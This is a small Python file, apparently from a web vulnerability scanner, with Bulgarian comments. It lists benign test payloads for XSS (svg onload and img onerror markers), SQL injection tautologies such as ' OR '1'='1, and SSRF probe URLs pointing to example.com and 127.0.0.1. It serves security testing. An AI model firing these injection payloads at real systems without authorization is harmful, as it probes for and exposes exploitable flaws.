# payloads.py
# Централизирани (safe) payloads. По подразбиране destructive: False.
# Използвай placeholders (%s) за вмъкване на уникални маркери при runtime.

PAYLOADS = {
    "xss": [
        {"payload": "<svg>%s</svg>", "destructive": False, "description": "benign svg marker"},
        {"payload": "\"><svg/onload=console.log('%s')>", "destructive": False, "description": "attribute-contained benign marker"},
        {"payload": "<img src=x onerror=console.log('%s')>", "destructive": False, "description": "onerror attribute marker (non-executing in many contexts)"},
    ],
    "sql": [
        {"payload": "' OR '1'='1", "destructive": False, "description": "boolean SQL test (non-invasive)"},
        {"payload": "\" OR \"1\"=\"1", "destructive": False, "description": "alternative quote boolean test"},
        # Избягваме time-based payloads по подразбиране (опасни)
    ],
    "ssrf": [
        {"payload": "http://example.com/ping?u=%s", "destructive": False, "description": "external URL indicator (use your collaborator domain when available)"},
        {"payload": "http://127.0.0.1/%s", "destructive": False, "description": "local IP indicator (passive evidence)"},
    ],
    "other": [
        {"payload": "%s", "destructive": False, "description": "simple marker placeholder (generic)"},
    ]
}